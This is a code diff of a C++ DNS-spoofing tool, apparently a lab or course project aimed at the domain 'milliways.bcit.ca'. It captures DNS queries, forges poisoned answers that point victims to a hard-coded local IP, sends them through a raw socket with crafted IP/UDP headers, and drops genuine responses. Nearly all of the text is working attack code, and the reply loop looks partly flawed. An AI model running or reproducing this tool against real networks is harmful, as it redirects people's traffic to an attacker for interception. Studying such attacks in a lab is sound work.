@@ -1,34 +1,17 @@
+#include "main.h"
+
 #include <iostream>
 #include <unordered_map>
 #include <vector>
 
 #include <stdio.h>
-#include <string.h>
 #include <unistd.h>
 
-#include "NetworkEngine.h"
-#include "UdpStack.h"
-
 #include "Config.h"
-#include "checksum.h"
 #include "dns.h"
 
 #include <fstream>
 #include <sstream>
-
-struct DnsSniffArgs {
-    NetworkEngine *net;
-    struct in_addr *victimIp;
-    struct in_addr *gatewayIP;
-    int rawSocket;
-};
-
-void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src, const struct in_addr &dst,
-                     const unsigned short sport, const unsigned short dport,
-                     const unsigned char *payload, const int payloadSize);
-void dnsSpoof(struct DnsSniffArgs *args);
-void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
-                  const unsigned char *packet);
 
 int main(int argc, const char *argv[]) {
     // Read strings from config file
@@ -155,37 +138,6 @@ int main(int argc, const char *argv[]) {
     return 0;
 }
 
-void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src, const struct in_addr &dst,
-                     const unsigned short sport, const unsigned short dport,
-                     const unsigned char *payload, const int payloadSize) {
-    struct iphdr *ipBuffer = (struct iphdr *)buffer;
-    struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
-    ipBuffer->ihl = 5;
-    ipBuffer->version = 4;
-    ipBuffer->tos = 0;
-    ipBuffer->id = (int)(244.0 * rand() / (RAND_MAX + 1.0));
-    ipBuffer->frag_off = 0;
-    ipBuffer->ttl = 64;
-    ipBuffer->protocol = IPPROTO_UDP;
-    ipBuffer->check = 0;
-    ipBuffer->saddr = htonl(src.s_addr);
-    ipBuffer->daddr = htonl(dst.s_addr);
-    ipBuffer->check = in_cksum((unsigned short *)ipBuffer, 20);
-    udpBuffer->source = htons(sport);
-    udpBuffer->dest = htons(dport);
-    udpBuffer->len = htons(8 + payloadSize);
-    struct UdpPseudoHeader pseudo_header;
-    pseudo_header.srcAddr = ipBuffer->saddr;
-    pseudo_header.dstAddr = ipBuffer->daddr;
-    pseudo_header.placeholder = 0;
-    pseudo_header.protocol = IPPROTO_UDP;
-    pseudo_header.udpLen = htons(udpBuffer->len);
-    memcpy((char *)&pseudo_header.udp, (char *)udpBuffer, 8);
-    short totalLen = 20 + 8 + payloadSize;
-    ipBuffer->tot_len = htons(totalLen);
-    memcpy(buffer + 20 + 8, payload, payloadSize);
-}
-
 void dnsSpoof(struct DnsSniffArgs *args) {
     int i;
 
@@ -239,12 +191,9 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     // tmp fake spoofing address
     struct in_addr spoofIp;
     spoofIp.s_addr = 0x1300a8c0;
-
     unsigned char addressFilter[] = {0x09, 'm', 'i', 'l', 'l', 'i',  'w', 'a', 'y', 's',
                                      0x04, 'b', 'c', 'i', 't', 0x02, 'c', 'a', 0x00};
 
-    unsigned char buffer[1500];
-    unsigned char frame[1500];
     struct iphdr *ip;
     struct udphdr *udp;
     dnshdr *dns;
@@ -258,52 +207,49 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
         return;
     }
 
+    unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
     int bytesSent;
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = udp->dest;
     sin.sin_addr.s_addr = ip->saddr;
 
-    unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
     if (dns->qr == DNS_QUERY) {
         // is it for a site we care about
         for (int i = 0; addressFilter[i]; i++) {
             if (addressFilter[i] != query[i]) {
                 // forward the captured packet without the ethernet header
                 bytesSent = sendto(params->rawSocket, packet + 14, header->caplen - 14, 0,
-                                       (struct sockaddr *)&sin, sizeof(sin));
+                                   (struct sockaddr *)&sin, sizeof(sin));
                 std::cout << "forwarding packet, size: " << bytesSent << std::endl;
                 return;
             }
+            unsigned char buffer[1500];
 
             // it is for a site we care about, forge poisoned response
-            memset(buffer, 0, 1500); // optimize this
-            int responseSize = forgeDns(dns, &spoofIp, buffer);
-            std::cout << "craft a response with size: " << responseSize << std::endl;
+            int responseSize = forgeDns(dns, &spoofIp, buffer + 20 + 8);
 
-            // reply
-            memset(frame, 0, 1500); // optimize this
             struct in_addr ogSrc;
             struct in_addr ogDst;
             ogSrc.s_addr = ntohl(ip->saddr);
             ogDst.s_addr = ntohl(ip->daddr);
-            fillIpUdpHeader(frame, ogDst, ogSrc, ntohs(udp->dest), ntohs(udp->source), buffer,
+            fillIpUdpHeader(buffer, ogDst, ogSrc, ntohs(udp->dest), ntohs(udp->source),
                             responseSize);
-            bytesSent = sendto(params->rawSocket, frame, 20 + 8 + responseSize, 0,
-                                   (struct sockaddr *)&sin, sizeof(sin));
+            bytesSent = sendto(params->rawSocket, buffer, 20 + 8 + responseSize, 0,
+                               (struct sockaddr *)&sin, sizeof(sin));
             std::cout << "sending reply, size: " << bytesSent << std::endl;
         }
     } else if (dns->qr == DNS_RESPONSE) {
         // is it for a site we care about
         for (int i = 0; addressFilter[i]; i++) {
             if (addressFilter[i] != query[i]) {
-                // forward here
+                // forward the captured packet without the ethernet header
+                bytesSent = sendto(params->rawSocket, packet + 14, header->caplen - 14, 0,
+                                   (struct sockaddr *)&sin, sizeof(sin));
+                std::cout << "forwarding packet, size: " << bytesSent << std::endl;
                 return;
             }
         }
-
-        // if it is the real response for a site we care about just drop it
+        // if it is the real response for a site we care about just ignore it
     }
-
-    // craft the poisoned response
 }
